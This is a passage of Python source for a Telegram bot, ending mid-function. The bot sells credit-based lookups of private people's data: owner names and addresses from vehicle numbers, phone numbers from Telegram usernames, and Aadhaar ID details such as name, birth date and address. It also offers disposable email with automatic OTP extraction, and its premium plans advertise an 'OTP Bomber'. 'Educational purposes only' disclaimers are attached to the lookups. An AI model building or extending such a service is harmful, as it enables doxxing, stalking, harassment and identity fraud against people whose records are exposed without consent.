    log_to_group(f"📧 TEMP MAIL CREATED\n👤 {uname}\n📧 {email_addr}")

@bot.callback_query_handler(func=lambda c: c.data.startswith("temp_check"))
@rate_limit_and_ban_check_cb
def check_temp_mail(c):
    uid = c.from_user.id
    
    if c.data == "temp_check":
        user_mails = [(mid, mail) for mid, mail in temp_mails_db.items() if mail['user_id'] == uid]
        if not user_mails:
            bot.answer_callback_query(c.id, "❌ No temp emails!", show_alert=True)
            return
        mail_id, mail_data = user_mails[-1]
        check_single_mail(c, mail_id, mail_data)
    else:
        mail_id = c.data.split("temp_check_")[1]
        if mail_id in temp_mails_db and temp_mails_db[mail_id]['user_id'] == uid:
            check_single_mail(c, mail_id, temp_mails_db[mail_id])
        else:
            bot.answer_callback_query(c.id, "❌ Not found!", show_alert=True)

def check_single_mail(c, mail_id, mail_data):
    uid = c.from_user.id
    email = mail_data['email']
    username, domain = email.split("@")
    
    bot.answer_callback_query(c.id, "📨 Checking...")
    
    try:
        url = f"https://www.1secmail.com/api/v1/?action=getMessages&login={username}&domain={domain}"
        response = requests.get(url, timeout=10)
        
        if response.status_code == 200:
            messages = response.json()
            temp_mails_db[mail_id]['last_checked'] = datetime.now().isoformat()
            save_database(TEMP_MAIL_DB_FILE, temp_mails_db)
            
            if messages:
                new_emails = []
                for msg in messages:
                    msg_id = msg['id']
                    existing = False
                    if 'emails' in temp_mails_db[mail_id]:
                        for existing_msg in temp_mails_db[mail_id]['emails']:
                            if existing_msg.get('id') == msg_id:
                                existing = True
                                break
                    
                    if not existing:
                        msg_url = f"https://www.1secmail.com/api/v1/?action=readMessage&login={username}&domain={domain}&id={msg_id}"
                        msg_response = requests.get(msg_url, timeout=10)
                        
                        if msg_response.status_code == 200:
                            msg_data = msg_response.json()
                            body = msg_data.get('textBody') or msg_data.get('htmlBody') or ''
                            otp = extract_otp(body)
                            
                            email_data = {
                                'id': msg_id,
                                'from': msg_data.get('from', 'Unknown'),
                                'subject': msg_data.get('subject', 'No Subject'),
                                'date': msg_data.get('date', datetime.now().strftime('%Y-%m-%d %H:%M:%S')),
                                'body': body[:1000],
                                'otp': otp
                            }
                            new_emails.append(email_data)
                
                if new_emails:
                    if 'emails' not in temp_mails_db[mail_id]:
                        temp_mails_db[mail_id]['emails'] = []
                    
                    temp_mails_db[mail_id]['emails'].extend(new_emails)
                    if len(temp_mails_db[mail_id]['emails']) > 20:
                        temp_mails_db[mail_id]['emails'] = temp_mails_db[mail_id]['emails'][-20:]
                    
                    save_database(TEMP_MAIL_DB_FILE, temp_mails_db)
                    
                    for email_data in new_emails:
                        response_text = f"📨 <b>New Email!</b>\n\n"
                        response_text += f"📧 <b>To:</b> {email}\n"
                        response_text += f"📩 <b>From:</b> {email_data['from']}\n"
                        response_text += f"📋 <b>Subject:</b> {email_data['subject']}\n"
                        response_text += f"📅 <b>Date:</b> {email_data['date']}\n\n"
                        
                        if email_data['otp']:
                            response_text += f"🔢 <b>OTP Found:</b> <code>{email_data['otp']}</code>\n\n"
                        
                        response_text += f"<b>Preview:</b>\n"
                        body_preview = email_data['body'][:500] + ("..." if len(email_data['body']) > 500 else "")
                        response_text += f"<code>{body_preview}</code>"
                        
                        mk = types.InlineKeyboardMarkup()
                        mk.add(
                            types.InlineKeyboardButton("🔄 Check Again", callback_data=f"temp_check_{mail_id}"),
                            types.InlineKeyboardButton("🗑 Delete", callback_data=f"temp_delete_{mail_id}")
                        )
                        
                        bot.send_message(c.message.chat.id, response_text, reply_markup=mk, parse_mode='HTML')
                else:
                    bot.send_message(c.message.chat.id, f"📭 <b>No New Emails</b>\n\n📧 {email}\n🕒 {datetime.now().strftime('%H:%M:%S')}", parse_mode='HTML')
            else:
                bot.send_message(c.message.chat.id, f"📭 <b>No Emails Yet</b>\n\n📧 {email}\n🕒 {datetime.now().strftime('%H:%M:%S')}", parse_mode='HTML')
        else:
            bot.send_message(c.message.chat.id, "❌ API error.", parse_mode='HTML')
    except Exception as e:
        bot.send_message(c.message.chat.id, f"❌ {e}", parse_mode='HTML')

def extract_otp(text):
    patterns = [
        r'(\b\d{4,6}\b)',
        r'OTP[:\s]*(\d{4,6})',
        r'code[:\s]*(\d{4,6})',
        r'verification[:\s]*(\d{4,6})',
        r'password[:\s]*(\d{4,6})',
        r'One Time Password[:\s]*(\d{4,6})',
        r'(\d{4,6}) is your OTP',
        r'OTP is (\d{4,6})'
    ]
    
    for pattern in patterns:
        match = re.search(pattern, text, re.IGNORECASE)
        if match:
            return match.group(1)
    return None

@bot.callback_query_handler(func=lambda c: c.data.startswith("temp_copy_"))
@rate_limit_and_ban_check_cb
def copy_temp_mail(c):
    mail_id = c.data.split("temp_copy_")[1]
    if mail_id in temp_mails_db:
        email = temp_mails_db[mail_id]['email']
        bot.answer_callback_query(c.id, f"📋 Copied: {email}")
        bot.send_message(c.message.chat.id, f"📧 <b>Email:</b>\n<code>{email}</code>\n\nClick and hold to copy.", parse_mode='HTML')
    else:
        bot.answer_callback_query(c.id, "❌ Not found!", show_alert=True)

@bot.callback_query_handler(func=lambda c: c.data == "temp_delete_menu")
@rate_limit_and_ban_check_cb
def temp_delete_menu(c):
    uid = c.from_user.id
    user_mails = [(mid, mail) for mid, mail in temp_mails_db.items() if mail['user_id'] == uid]
    
    if not user_mails:
        bot.answer_callback_query(c.id, "📭 No temp emails to delete", show_alert=True)
        return
    
    mk = types.InlineKeyboardMarkup(row_width=1)
    for mail_id, mail_data in user_mails:
        email = mail_data['email']
        created = datetime.fromisoformat(mail_data['created']).strftime('%H:%M')
        mk.add(types.InlineKeyboardButton(f"🗑 {email} ({created})", callback_data=f"temp_delete_{mail_id}"))
    
    mk.add(types.InlineKeyboardButton("🗑 Delete All", callback_data="temp_delete_all"))
    mk.add(types.InlineKeyboardButton("❌ Cancel", callback_data="temp_cancel_delete"))
    
    bot.send_message(c.message.chat.id, "🗑 <b>Select Email to Delete:</b>", reply_markup=mk, parse_mode='HTML')

@bot.callback_query_handler(func=lambda c: c.data.startswith("temp_delete_"))
@rate_limit_and_ban_check_cb
def delete_temp_mail(c):
    uid = c.from_user.id
    
    if c.data == "temp_delete_all":
        mails_to_delete = [mid for mid, mail in temp_mails_db.items() if mail['user_id'] == uid]
        if not mails_to_delete:
            bot.answer_callback_query(c.id, "📭 No emails", show_alert=True)
            return
        
        deleted_count = 0
        for mail_id in mails_to_delete:
            del temp_mails_db[mail_id]
            deleted_count += 1
        save_database(TEMP_MAIL_DB_FILE, temp_mails_db)
        
        if uid in temp_mail_sessions:
            del temp_mail_sessions[uid]
        
        bot.answer_callback_query(c.id, f"🗑 Deleted {deleted_count}!")
        bot.send_message(c.message.chat.id, f"🗑 <b>All Deleted</b>\n\n✅ {deleted_count} email(s) removed.", parse_mode='HTML')
        
        uname = f"@{c.from_user.username}" if c.from_user.username else f"ID:{uid}"
        log_to_group(f"🗑 ALL TEMP MAILS DELETED\n👤 {uname}\n📧 {deleted_count}")
        return
    
    mail_id = c.data.split("temp_delete_")[1]
    if mail_id in temp_mails_db and temp_mails_db[mail_id]['user_id'] == uid:
        email = temp_mails_db[mail_id]['email']
        del temp_mails_db[mail_id]
        save_database(TEMP_MAIL_DB_FILE, temp_mails_db)
        
        if uid in temp_mail_sessions and temp_mail_sessions[uid] == mail_id:
            del temp_mail_sessions[uid]
        
        bot.answer_callback_query(c.id, f"🗑 Deleted: {email}")
        bot.delete_message(c.message.chat.id, c.message.message_id)
        bot.send_message(c.message.chat.id, f"🗑 <b>Deleted</b>\n\n📧 {email}\n✅ Removed successfully.", parse_mode='HTML')
        
        uname = f"@{c.from_user.username}" if c.from_user.username else f"ID:{uid}"
        log_to_group(f"🗑 TEMP MAIL DELETED\n👤 {uname}\n📧 {email}")
    else:
        bot.answer_callback_query(c.id, "❌ Not found!", show_alert=True)

@bot.callback_query_handler(func=lambda c: c.data == "temp_cancel_delete")
@rate_limit_and_ban_check_cb
def temp_cancel_delete(c):
    bot.answer_callback_query(c.id, "❌ Cancelled")
    bot.delete_message(c.message.chat.id, c.message.message_id)

@bot.callback_query_handler(func=lambda c: c.data == "temp_refresh")
@rate_limit_and_ban_check_cb
def refresh_temp_inbox(c):
    uid = c.from_user.id
    user_mails = [(mid, mail) for mid, mail in temp_mails_db.items() if mail['user_id'] == uid]
    
    if not user_mails:
        bot.answer_callback_query(c.id, "❌ No temp emails!", show_alert=True)
        return
    
    bot.answer_callback_query(c.id, "🔄 Refreshing...")
    for mail_id, mail_data in user_mails:
        check_single_mail(c, mail_id, mail_data)
        time.sleep(1)

@bot.callback_query_handler(func=lambda c: c.data == "temp_list")
@rate_limit_and_ban_check_cb
def list_temp_mails(c):
    uid = c.from_user.id
    user_mails = [(mid, mail) for mid, mail in temp_mails_db.items() if mail['user_id'] == uid]
    
    if not user_mails:
        bot.answer_callback_query(c.id, "📭 No temp emails", show_alert=True)
        return
    
    response = "📧 <b>Your Temp Emails:</b>\n\n"
    for i, (mail_id, mail_data) in enumerate(user_mails, 1):
        email = mail_data['email']
        created = datetime.fromisoformat(mail_data['created']).strftime('%H:%M')
        email_count = len(mail_data.get('emails', []))
        response += f"{i}. <code>{email}</code>\n   📅 {created} | 📨 {email_count}\n\n"
    
    response += f"Total: {len(user_mails)}"
    
    mk = types.InlineKeyboardMarkup()
    for mail_id, mail_data in user_mails[-3:]:
        email = mail_data['email']
        mk.add(types.InlineKeyboardButton(f"📧 {email[:15]}...", callback_data=f"temp_check_{mail_id}"))
    mk.add(types.InlineKeyboardButton("➕ Create New", callback_data="temp_create"))
    
    bot.send_message(c.message.chat.id, response, reply_markup=mk, parse_mode='HTML')

# ==========================================
# 📞 NUMBER LOOKUP
# ==========================================
@bot.message_handler(commands=['num'])
@rate_limit_and_ban_check
@feature_check("number_lookup")
def num_lookup(m):
    if not is_authenticated(m.from_user.id):
        ask_password(m)
        return
        
    uid = m.from_user.id
    joined, channel = check_all_channels_join(uid)
    if not joined:
        show_channels_to_join(m, uid)
        return
    
    try:
        num = m.text.split()[1]
        if not num.isdigit():
            raise ValueError
    except:
        bot.reply_to(m, "📌 <b>Usage:</b> /num 9876543210", parse_mode='HTML')
        return
    
    user_info = users_db.get(str(uid), {})
    if user_info.get('credits', 0) < 1:
        bot.reply_to(m, f"❌ <b>Insufficient Credits!</b>\n\nYou have {user_info.get('credits', 0)}.\nGet more:\n• Daily bonus (5/day)\n• Referrals (2 each)\n• Premium packages", parse_mode='HTML')
        return
    
    bot.send_chat_action(m.chat.id, "typing")
    
    api_url = apis_db.get("NUMBER_API", APIS["NUMBER_API"])
    
    try:
        response = requests.get(f"{api_url}{num}", timeout=10)
        
        if response.status_code == 200:
            data = response.json()
            
            if str(uid) in users_db:
                users_db[str(uid)]['credits'] = max(0, users_db[str(uid)].get('credits', 0) - 1)
                save_database(USERS_DB_FILE, users_db)
            
            formatted_text = "✅ <b>Number Information</b>\n\n"
            formatted_text += f"📱 <b>Phone:</b> +91{num}\n"
            formatted_text += f"📅 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
            
            if isinstance(data, dict):
                for key, value in data.items():
                    if value and str(value).strip():
                        formatted_text += f"<b>{key.replace('_', ' ').title()}:</b> {value}\n"
            elif isinstance(data, list):
                for item in data[:10]:
                    if isinstance(item, dict):
                        for k, v in item.items():
                            if v and str(v).strip():
                                formatted_text += f"<b>{k}:</b> {v}\n"
                        formatted_text += "─\n"
            
            formatted_text += f"\n🤖 {BOT_USERNAME} | 👑 {OWNER_USERNAME}"
            bot.reply_to(m, formatted_text, parse_mode='HTML')
            
            uname = f"@{m.from_user.username}" if m.from_user.username else f"ID:{uid}"
            log_to_group(f"📞 NUMBER LOOKUP\n👤 {uname}\n📱 {num}")
        else:
            bot.reply_to(m, f"❌ API Error: {response.status_code}", parse_mode='HTML')
    except Exception as e:
        bot.reply_to(m, f"❌ Error: {e}\nCredit not deducted.", parse_mode='HTML')

@bot.message_handler(func=lambda m: m.text == "📞 Number Lookup")
@rate_limit_and_ban_check
def num_lookup_button(m):
    if not is_authenticated(m.from_user.id):
        ask_password(m)
        return
    bot.reply_to(m, "📞 <b>Number Lookup</b>\n\n<b>Usage:</b> /num 9876543210\n\n💡 Requires 1 credit", parse_mode='HTML')

# ==========================================
# 🚗 VEHICLE LOOKUP
# ==========================================
@bot.message_handler(commands=['vehicle', 'car'])
@rate_limit_and_ban_check
@feature_check("vehicle_lookup")
def vehicle_lookup(m):
    if not is_authenticated(m.from_user.id):
        ask_password(m)
        return
        
    uid = m.from_user.id
    joined, channel = check_all_channels_join(uid)
    if not joined:
        show_channels_to_join(m, uid)
        return
    
    try:
        vehicle_num = m.text.split()[1].upper()
        if len(vehicle_num) < 5:
            raise ValueError
    except:
        bot.reply_to(m, "📌 <b>Usage:</b> /vehicle KA01AB1234", parse_mode='HTML')
        return
    
    user_info = users_db.get(str(uid), {})
    if user_info.get('credits', 0) < 2:
        bot.reply_to(m, f"❌ <b>Insufficient Credits!</b>\n\nYou have {user_info.get('credits', 0)}.\nVehicle lookup needs 2 credits.", parse_mode='HTML')
        return
    
    bot.send_chat_action(m.chat.id, "typing")
    
    api_url = apis_db.get("VEHICLE_API", APIS["VEHICLE_API"])
    
    try:
        encoded_number = urllib.parse.quote(vehicle_num)
        response = requests.get(f"{api_url}{encoded_number}", timeout=15)
        
        if response.status_code == 200:
            data = response.json()
            
            if str(uid) in users_db:
                users_db[str(uid)]['credits'] = max(0, users_db[str(uid)].get('credits', 0) - 2)
                save_database(USERS_DB_FILE, users_db)
            
            formatted_text = "🚗 <b>Vehicle Information</b>\n\n"
            formatted_text += f"🔢 <b>Vehicle:</b> {vehicle_num}\n"
            formatted_text += f"📅 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
            
            if isinstance(data, dict):
                fields = {
                    'owner_name': '👤 Owner',
                    'father_name': '👨 Father',
                    'address': '📍 Address',
                    'registration_date': '📅 Registration',
                    'vehicle_class': '🚗 Class',
                    'fuel_type': '⛽ Fuel',
                    'engine_no': '⚙️ Engine',
                    'chassis_no': '🔩 Chassis',
                    'maker_model': '🏭 Model',
                    'fitness_upto': '✅ Fitness',
                    'insurance_upto': '🛡️ Insurance',
                    'tax_upto': '💰 Tax'
                }
                
                for key, display_name in fields.items():
                    if key in data and data[key]:
                        formatted_text += f"<b>{display_name}:</b> {data[key]}\n"
                
                if 'status' in data:
                    formatted_text += f"\n<b>📊 Status:</b> {data['status']}\n"
            else:
                formatted_text += f"<b>Response:</b>\n<code>{json.dumps(data, indent=2, ensure_ascii=False)[:1500]}</code>"
            
            formatted_text += f"\n\n🤖 {BOT_USERNAME} | 👑 {OWNER_USERNAME}"
            bot.reply_to(m, formatted_text, parse_mode='HTML')
            
            uname = f"@{m.from_user.username}" if m.from_user.username else f"ID:{uid}"
            log_to_group(f"🚗 VEHICLE LOOKUP\n👤 {uname}\n🚗 {vehicle_num}")
        else:
            bot.reply_to(m, f"❌ API Error: {response.status_code}", parse_mode='HTML')
    except Exception as e:
        bot.reply_to(m, f"❌ Error: {e}\nCredits not deducted.", parse_mode='HTML')

@bot.message_handler(func=lambda m: m.text == "🚗 Vehicle Lookup")
@rate_limit_and_ban_check
def vehicle_lookup_button(m):
    if not is_authenticated(m.from_user.id):
        ask_password(m)
        return
    bot.reply_to(m, "🚗 <b>Vehicle Lookup</b>\n\n<b>Usage:</b> /vehicle KA01AB1234\n\n<b>Examples:</b>\n/vehicle KA01AB1234\n/vehicle MH12DE4567\n\n💡 Requires 2 credits", parse_mode='HTML')

# ==========================================
# 🕵️ SHERLOCK LOOKUP
# ==========================================
@bot.message_handler(commands=['sherlock', 'phonefinder'])
@rate_limit_and_ban_check
@feature_check("sherlock_lookup")
def sherlock_lookup(m):
    if not is_authenticated(m.from_user.id):
        ask_password(m)
        return
        
    uid = m.from_user.id
    joined, channel = check_all_channels_join(uid)
    if not joined:
        show_channels_to_join(m, uid)
        return
    
    try:
        username = m.text.split()[1]
        if not username.strip():
            raise ValueError
    except:
        bot.reply_to(m, "📌 <b>Usage:</b> /sherlock username", parse_mode='HTML')
        return
    
    user_info = users_db.get(str(uid), {})
    if user_info.get('credits', 0) < 1:
        bot.reply_to(m, f"❌ <b>Insufficient Credits!</b>\n\nYou have {user_info.get('credits', 0)}.\nSherlock needs 1 credit.", parse_mode='HTML')
        return
    
    bot.send_chat_action(m.chat.id, "typing")
    
    api_url = apis_db.get("SHERLOCK_API", APIS["SHERLOCK_API"])
    
    try:
        encoded_username = urllib.parse.quote(username)
        response = requests.get(f"{api_url}{encoded_username}", timeout=15)
        
        if response.status_code == 200:
            data = response.json()
            
            if str(uid) in users_db:
                users_db[str(uid)]['credits'] = max(0, users_db[str(uid)].get('credits', 0) - 1)
                save_database(USERS_DB_FILE, users_db)
            
            formatted_text = "🕵️ <b>Sherlock Lookup</b>\n\n"
            formatted_text += f"👤 <b>Username:</b> @{username}\n"
            formatted_text += f"📅 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
            
            if isinstance(data, dict):
                if 'phone' in data and data['phone']:
                    formatted_text += f"✅ <b>Phone Found!</b>\n\n"
                    formatted_text += f"📱 <b>Phone:</b> {data['phone']}\n"
                    if 'carrier' in data and data['carrier']:
                        formatted_text += f"📞 <b>Carrier:</b> {data['carrier']}\n"
                    if 'location' in data and data['location']:
                        formatted_text += f"📍 <b>Location:</b> {data['location']}\n"
                    if 'registered' in data and data['registered']:
                        formatted_text += f"📅 <b>Registered:</b> {data['registered']}\n"
                elif 'error' in data:
                    formatted_text += f"❌ <b>Error:</b> {data['error']}\n"
                else:
                    formatted_text += "❌ <b>No phone found.</b>\n"
            elif isinstance(data, list):
                formatted_text += "<b>Results:</b>\n\n"
                for i, item in enumerate(data[:5], 1):
                    if isinstance(item, dict) and 'phone' in item:
                        formatted_text += f"{i}. 📱 {item.get('phone', 'N/A')}\n"
                        if 'platform' in item:
                            formatted_text += f"   🌐 {item['platform']}\n"
                        formatted_text += "\n"
            
            formatted_text += f"\n🤖 {BOT_USERNAME} | 👑 {OWNER_USERNAME}"
            bot.reply_to(m, formatted_text, parse_mode='HTML')
            
            uname = f"@{m.from_user.username}" if m.from_user.username else f"ID:{uid}"
            log_to_group(f"🕵️ SHERLOCK\n👤 {uname}\n👤 Target: {username}")
        else:
            bot.reply_to(m, f"❌ API Error: {response.status_code}", parse_mode='HTML')
    except Exception as e:
        bot.reply_to(m, f"❌ Error: {e}\nCredit not deducted.", parse_mode='HTML')

@bot.message_handler(func=lambda m: m.text == "🕵️ Sherlock Lookup")
@rate_limit_and_ban_check
def sherlock_lookup_button(m):
    if not is_authenticated(m.from_user.id):
        ask_password(m)
        return
    bot.reply_to(m, "🕵️ <b>Sherlock Phone Finder</b>\n\n<b>Usage:</b> /sherlock username\n\n<b>Examples:</b>\n/sherlock john_doe\n/sherlock alice123\n\n💡 Requires 1 credit\n\n🔍 Find phone numbers linked to Telegram usernames.", parse_mode='HTML')

# ==========================================
# 🔍 AADHAAR LOOKUP
# ==========================================
@bot.message_handler(commands=['aadhaar', 'adhar'])
@rate_limit_and_ban_check
@feature_check("aadhaar_lookup")
def aadhaar_lookup(m):
    if not is_authenticated(m.from_user.id):
        ask_password(m)
        return
        
    uid = m.from_user.id
    joined, channel = check_all_channels_join(uid)
    if not joined:
        show_channels_to_join(m, uid)
        return
    
    try:
        aadhaar = m.text.split()[1]
        if not aadhaar.isdigit() or len(aadhaar) != 12:
            raise ValueError
    except:
        bot.reply_to(m, "📌 <b>Usage:</b> /aadhaar 123456789012\n\n⚠️ Educational purposes only!", parse_mode='HTML')
        return
    
    user_info = users_db.get(str(uid), {})
    if user_info.get('credits', 0) < 2:
        bot.reply_to(m, f"❌ <b>Insufficient Credits!</b>\n\nYou have {user_info.get('credits', 0)}.\nAadhaar lookup needs 2 credits.", parse_mode='HTML')
        return
    
    warning_msg = (
        "⚠️ <b>LEGAL DISCLAIMER</b> ⚠️\n\n"
        "This tool is for <b>EDUCATIONAL PURPOSES ONLY</b>.\n"
        "Unauthorized access to Aadhaar is illegal.\n\n"
        "By using this tool, you agree:\n"
        "1. Not to misuse information\n"
        "2. Take full responsibility\n"
        "3. Educational/research only\n\n"
        "Do you want to continue?"
    )
    
    mk = types.InlineKeyboardMarkup()
    mk.add(
        types.InlineKeyboardButton("✅ Yes, I Understand", callback_data=f"aadhaar_yes_{aadhaar}"),
        types.InlineKeyboardButton("❌ Cancel", callback_data="aadhaar_no")
    )
    
    bot.reply_to(m, warning_msg, reply_markup=mk, parse_mode='HTML')

@bot.callback_query_handler(func=lambda c: c.data.startswith("aadhaar_"))
@rate_limit_and_ban_check_cb
def aadhaar_confirm(c):
    if c.data == "aadhaar_no":
        bot.answer_callback_query(c.id, "❌ Cancelled.")
        bot.delete_message(c.message.chat.id, c.message.message_id)
        return
    
    if c.data.startswith("aadhaar_yes_"):
        aadhaar = c.data.split("aadhaar_yes_")[1]
        uid = c.from_user.id
        
        if str(uid) in users_db:
            users_db[str(uid)]['credits'] = max(0, users_db[str(uid)].get('credits', 0) - 2)
            save_database(USERS_DB_FILE, users_db)
        
        bot.answer_callback_query(c.id, "🔍 Fetching...")
        bot.edit_message_text("🔍 Fetching Aadhaar details...", c.message.chat.id, c.message.message_id, parse_mode='HTML')
        
        api_url = apis_db.get("AADHAAR_API", APIS["AADHAAR_API"])
        
        try:
            response = requests.get(f"{api_url}{aadhaar}", timeout=30)
            
            if response.status_code == 200:
                data = response.json()
                
                formatted_text = (
                    f"✅ <b>Aadhaar Details</b>\n\n"
                    f"🔢 <b>Aadhaar:</b> {aadhaar}\n"
                    f"📅 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
                )
                
                if isinstance(data, dict):
                    fields = {
                        'name': '👤 Name',
                        'gender': '⚥ Gender',
                        'dob': '🎂 Date of Birth',
                        'address': '📍 Address',
                        'photo': '📸 Photo Available',
                        'status': '📊 Status'
                    }
                    
                    for key, display_name in fields.items():
                        if key in data and data[key]:
                            formatted_text += f"<b>{display_name}:</b> {data[key]}\n"
                    
                    masked_aadhaar = f"{aadhaar[:4]}****{aadhaar[-4:]}"
                    formatted_text += f"\n🔒 <b>Masked:</b> {masked_aadhaar}\n"
                else:
                    formatted_text += f"<b>Response:</b>\n<code>{json.dumps(data, indent=2, ensure_ascii=False)[:1500]}</code>\n\n"
                
                formatted_text += f"\n⚠️ Educational use only!\n👑 {OWNER_USERNAME}"
                bot.edit_message_text(formatted_text, c.message.chat.id, c.message.message_id, parse_mode='HTML')
                
                uname = f"@{c.from_user.username}" if c.from_user.username else f"ID:{uid}"
                masked = f"{aadhaar[:4]}****{aadhaar[-4:]}"
                log_to_group(f"🔍 AADHAAR LOOKUP\n👤 {uname}\n🔢 {masked}")
            else:
                bot.edit_message_text(f"❌ API Error!\nStatus: {response.status_code}", c.message.chat.id, c.message.message_id, parse_mode='HTML')
        except Exception as e:
            bot.edit_message_text(f"❌ Error: {e}\n\nCredits refunded.", c.message.chat.id, c.message.message_id, parse_mode='HTML')
            if str(uid) in users_db:
                users_db[str(uid)]['credits'] = users_db[str(uid)].get('credits', 0) + 2
                save_database(USERS_DB_FILE, users_db)

@bot.message_handler(func=lambda m: m.text == "🔍 Aadhaar Info")
@rate_limit_and_ban_check
def aadhaar_button(m):
    if not is_authenticated(m.from_user.id):
        ask_password(m)
        return
    bot.reply_to(m, "🔍 <b>Aadhaar Lookup</b>\n\n<b>Usage:</b> /aadhaar 123456789012\n\n⚠️ <b>Important:</b>\n• Requires 2 credits\n• Educational purposes only\n• Use only your own Aadhaar", parse_mode='HTML')

# ==========================================
# 🔑 REDEEM KEY
# ==========================================
@bot.message_handler(func=lambda m: m.text == "🔑 Redeem Key")
@rate_limit_and_ban_check
def redeem_key_menu(m):
    if not is_authenticated(m.from_user.id):
        ask_password(m)
        return
        
    uid = m.from_user.id
    joined, channel = check_all_channels_join(uid)
    if not joined:
        show_channels_to_join(m, uid)
        return
    
    action_sessions[uid] = "redeem_key"
    bot.reply_to(m, "🔑 <b>Redeem Key</b>\n\nEnter your key:\n<code>King-XXXX-XXXX-XXXX</code>\n\nType /cancel to cancel.", parse_mode='HTML')

@bot.message_handler(func=lambda m: action_sessions.get(m.from_user.id) == "redeem_key")
@rate_limit_and_ban_check
def redeem_key_process(m):
    uid = m.from_user.id
    key = m.text.strip().upper()
    
    if key == '/CANCEL':
        if uid in action_sessions:
            del action_sessions[uid]
        bot.reply_to(m, "❌ Cancelled.", parse_mode='HTML')
        return
    
    if key in keys_db and not keys_db[key].get('used', False):
        key_data = keys_db[key]
        key_type = key_data['type']
        value = key_data['value']
        
        if key_type == "PREM":
            expiry = (datetime.now() + timedelta(days=value)).isoformat()
            subs_db[str(uid)] = {'expiry': expiry}
            save_database(SUBS_DB_FILE, subs_db)
            msg = f"🎉 <b>Premium Activated!</b>\n⏰ {value} Days"
        elif key_type == "CREDIT":
            if str(uid) in users_db:
                users_db[str(uid)]['credits'] = users_db[str(uid)].get('credits', 0) + value
                save_database(USERS_DB_FILE, users_db)
            msg = f"💰 <b>Credits Added!</b>\n➕ +{value} Credits"
        else:
            bot.reply_to(m, "❌ Invalid key type", parse_mode='HTML')
            return
        
        keys_db[key]['used'] = True
        keys_db[key]['used_by'] = uid
        keys_db[key]['used_date'] = datetime.now().isoformat()
        save_database(KEYS_DB_FILE, keys_db)
        
        uname = f"@{m.from_user.username}" if m.from_user.username else f"ID:{uid}"
        log_to_group(f"🔑 KEY REDEEMED\n👤 {uname}\n🔑 {key}\n📊 {key_type}\n💎 {value}")
        
        bot.reply_to(m, f"✅ {msg}", parse_mode='HTML')
    else:
        bot.reply_to(m, "❌ <b>Invalid or Used Key!</b>", parse_mode='HTML')
    
    if uid in action_sessions:
        del action_sessions[uid]

# ==========================================
# 💎 PRICING
# ==========================================
@bot.message_handler(func=lambda m: m.text == "💎 Pricing")
@rate_limit_and_ban_check
def pricing(m):
    if not is_authenticated(m.from_user.id):
        ask_password(m)
        return
        
    uid = m.from_user.id
    joined, channel = check_all_channels_join(uid)
    if not joined:
        show_channels_to_join(m, uid)
        return
    
    pricing_text = (
        f"💎 <b>PREMIUM PLANS</b> 💎\n"
        "══════════════════════════════\n\n"
        "🟢 <b>7 Days Premium</b> - ₹200\n"
        "• Unlimited File Hosting\n"
        "• Kali Terminal\n"
        "• VPS Manager\n"
        "• Instagram Downloader\n"
        "• OTP Bomber\n"
        "• Priority Support\n\n"
        "🔵 <b>30 Days Premium</b> - ₹600\n"
        "• All 7-day features\n"
        "• Extended support\n"
        "• Backup priority\n"
        "• VIP Channel Access\n\n"
        "🟣 <b>60 Days Premium</b> - ₹1,100\n"
        "• All 30-day features\n"
        "• VIP support\n"
        "• Early access\n"
        "• Custom Tools\n\n"
        "🟡 <b>Lifetime</b> - DM for price\n"
        "• Permanent access\n"
        "• VIP status\n\n"
        "💳 <b>Payment:</b> UPI, PayPal, Crypto\n\n"
        f"📲 <b>Contact:</b> {OWNER_USERNAME}\n\n"
        "✨ <b>All users get:</b>\n"
        "• 5 Daily credits\n"
        "• C to Binary\n"
        "• File hosting (1 file)\n"
        "• Number lookup\n"
        "• Vehicle lookup (2 cr)\n"
        "• Sherlock lookup (1 cr)\n"
        "• Aadhaar lookup (2 cr)\n"
        "• Referral rewards\n"
        "• Temp Mail (Free)"
    )
    
    bot.reply_to(m, pricing_text, parse_mode='HTML')

# ==========================================
# 👑 OWNER PANEL (WITH PASSWORD CHANGE + BOT ON/OFF)
# ==========================================
@bot.message_handler(func=lambda m: m.text == "👑 Owner Panel")
@rate_limit_and_ban_check
def owner_panel(m):
    uid = m.from_user.id
    
    if uid != ADMIN_ID:
        bot.reply_to(m, "❌ Not authorized!", parse_mode='HTML')
        return
    
    password_display = '*' * len(BOT_PASSWORD)
    bot_status = "🟢 ONLINE" if BOT_ENABLED else "🔴 OFFLINE"
    
    mk = types.InlineKeyboardMarkup(row_width=2)
    mk.add(
        types.InlineKeyboardButton("🔑 Gen Key", callback_data="op_gen_key"),
        types.InlineKeyboardButton("📊 Stats", callback_data="op_stats")
    )
    mk.add(
        types.InlineKeyboardButton("📢 Broadcast", callback_data="op_broadcast"),
        types.InlineKeyboardButton("👤 User Mgmt", callback_data="op_user_mgmt")
    )
    mk.add(
        types.InlineKeyboardButton("📦 Requirements", callback_data="op_requirements"),
        types.InlineKeyboardButton("📢 Channels", callback_data="op_channel_mgmt")
    )
    mk.add(
        types.InlineKeyboardButton("🗑 Delete Key", callback_data="op_delete_key"),
        types.InlineKeyboardButton("🔄 Update", callback_data="op_update_all")
    )
    mk.add(
        types.InlineKeyboardButton("🔧 Features", callback_data="op_feature_control"),
        types.InlineKeyboardButton("🌐 APIs", callback_data="op_api_management")
    )
    mk.add(
        types.InlineKeyboardButton("🔐 Auth Users", callback_data="op_auth_users")
    )
    
    # 🔴 NEW BUTTONS
    mk.add(
        types.InlineKeyboardButton("🔑 Change Password", callback_data="op_change_password"),
        types.InlineKeyboardButton(f"🔴 Bot: {bot_status}", callback_data="op_bot_toggle")
    )
    
    bot.reply_to(
        m,
        f"👑 <b>OWNER PANEL</b>\n\n"
        f"🔐 Password: <code>{password_display}</code> ({len(BOT_PASSWORD)} chars)\n"
        f"🤖 Bot Status: {bot_status}\n\n"
        f"Select option:",
        reply_markup=mk,
        parse_mode='HTML'
    )

# ==========================================
# 🔑 CHANGE PASSWORD
# ==========================================
@bot.callback_query_handler(func=lambda c: c.data == "op_change_password" and c.from_user.id == ADMIN_ID)
@rate_limit_and_ban_check_cb
def change_password_menu(c):
    uid = c.from_user.id
    action_sessions[uid] = "change_password"
    
    bot.answer_callback_query(c.id)
    bot.send_message(
        c.message.chat.id,
        f"🔑 <b>CHANGE BOT PASSWORD</b>\n\n"
